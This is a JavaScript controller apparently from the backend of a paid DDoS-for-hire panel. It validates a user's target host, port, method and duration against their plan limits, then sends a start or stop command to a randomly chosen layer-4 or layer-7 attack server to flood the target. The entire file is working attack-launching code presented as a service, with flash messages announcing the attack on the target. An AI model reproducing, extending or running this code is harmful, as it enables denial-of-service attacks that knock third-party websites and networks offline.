'use strict'
const Attack            = use('App/Models/Attack')
const Servers           = use('App/Models/Server')
const Methods           = use('App/Models/Method')
const User              = use('App/Models/User')
const Database          = use('Database')
const { validate }      = use('Validator')
const { validateAll }   = use('Validator')
const IP_ADDR           = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/
const URL_ADDR          = /((([A-Za-z]{3,9}:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-_]*)?\??(?:[\-\+=&;%@\.\w_]*)#?(?:[\.\!\/\\\w]*))?)/
class AttackController {
	async create({request, session, response, auth}) {
		if(auth.user.plan > 0) {
			const method    = await Methods.findOrFail(request.input('method'))
			const user      = await User.query().with('userPlan').where('id', auth.user.id).fetch()
			const userJson  = await user.toJSON()
			const attacks   = await Database
				.from('attacks')
				.where('user_id', auth.user.id)
				.where('stopped', '0')
				.where('time_all', '>', Math.round((new Date()).getTime() / 1000))
                .count()
                    
            const total = attacks[0]['count(*)']
            
			if(userJson[0].userPlan.attacks == total){
				session.flash({ bad_notification: 'You have too many tests running!' })   
				return response.redirect('back')
			}

			if(method.type == '4' && !IP_ADDR.test(request.input('host'))){
				session.flash({ bad_notification: 'Host is not a valid IP address' }) 
				return response.redirect('back')  
			}

			if(method.type == '7' && !URL_ADDR.test(request.input('host'))){
				session.flash({ bad_notification: 'Host is not a valid URL address' }) 
				return response.redirect('back')  
			}

			if(Number.parseFloat(request.input('time')) > userJson[0].userPlan.time){
				session.flash({ bad_notification: `Time exceeds the allowed time (${userJson[0].userPlan.time} sec.)` })   
				return response.redirect('back')
			}else if(Number.parseFloat(request.input('time')) <= 0){
				session.flash({ bad_notification: 'Invalid time' })   
				return response.redirect('back')
			}

			// L4 Servers parsing
			const serversL4		= await Servers.query().where('type', '4').where('active', '1').fetch()
			const serversL4Json	= serversL4.toJSON()
			var serverL4		= serversL4Json[Math.floor(Math.random() * serversL4Json.length)]
			// L7 servers parsing
			const serversL7		= await Servers.query().where('type', '7').where('active', '1').fetch()
			const serversL7Json	= serversL7.toJSON()
			var serverL7		= serversL7Json[Math.floor(Math.random() * serversL7Json.length)]

			const data = request.only(['host', 'port', 'time', 'method'])

			const rules = {
				host:   'required|min:6',
				port:   'required|min:2|integer',
				time:   'required|integer',
				method: 'required',
			}
			const messages = {
				'host.required'     : 'Host is required',
				'host.url'          : 'Host is required',
				'port.required'     : 'Port is required',
				'time.required'     : 'Time is required',
                'time.integer'      : 'Invalid time',
                'time.min'          : 'Your attack must be over 10 seconds long',
				'method.required'   : 'Method is required',
			}
        
			const validation	= await validateAll(data, rules, messages)

			if (validation.fails()) {
				session
					.withErrors(validation.messages())

				return response.redirect('back')
			}
        
			const attack		= new Attack()

			attack.user_id		= auth.user.id
			attack.target		= request.input('host')
			attack.port			= request.input('port')
			attack.time			= request.input('time')
			attack.method		= request.input('method')
			attack.stopped		= '0'
			attack.started_at	= Math.round((new Date()).getTime() / 1000)
			attack.time_all		= Math.round((new Date()).getTime() / 1000) + parseInt(request.input('time'))

			if(method.type == '7'){
				attack.server	= serverL7.id
			}else if(method.type == '4'){
				attack.server	= serverL4.id  
			}

			await attack.save()
			var request			= require('request')
			if(method.type == '4'){
				request(`${serverL4.addr}/${serverL4.resource}?target=${encodeURI(attack.target)}:${attack.port}&method=${method.name}&time=${attack.time}`)
				session.flash({ good_notification: `The attack is started on ${encodeURI(attack.target)}:${attack.port} for ${attack.time} seconds` })
				return response.redirect('back')
			}else if(method.type == '7'){
				request(`${serverL7.addr}/${serverL7.resource}?target=${encodeURI(attack.target)}:${attack.port}&method=${method.name}&time=${attack.time}`)
				session.flash({ good_notification: `Attack is started on ${encodeURI(attack.target)}:${attack.port} for ${attack.time} sec.` })   
				return response.redirect('back')
			}
		}else{
			response.status(403).send('Forbidden')
		}
	}

	async stop({request, session, response, auth}){
		if(auth.user.plan > 0){
			const data		= request.only(['attackID'])
			var id			= request.input('attackID')
			const attack	= await Attack.findOrFail(request.input('attackID'))
			if(attack.user_id == auth.user.id){
				try{
					const server		= await Attack.query().with('useServer').where('id', request.input('attackID')).fetch()
					const serverJson	= await server.toJSON()
					var request = require('request')
					request(`${serverJson[0].useServer.addr}/${serverJson[0].useServer.resource}?target=${encodeURI(attack.target)}:${attack.port}&method=STOP&time=${attack.time}`, function (error, response, body) {
						console.log('body:', body) // DELETE
					})
					await Database
						.table('attacks')
						.where('id', id)
						.update('stopped', '1')
					session.flash({ good_notification: 'Attack Has Been Stopped!' })
					return response.redirect('back')
				}catch(errors){
					session.flash({ bad_notification: 'An error has occurred!' })
					return response.redirect('back') 
				}
			}
		}
	}
}
module.exports = AttackController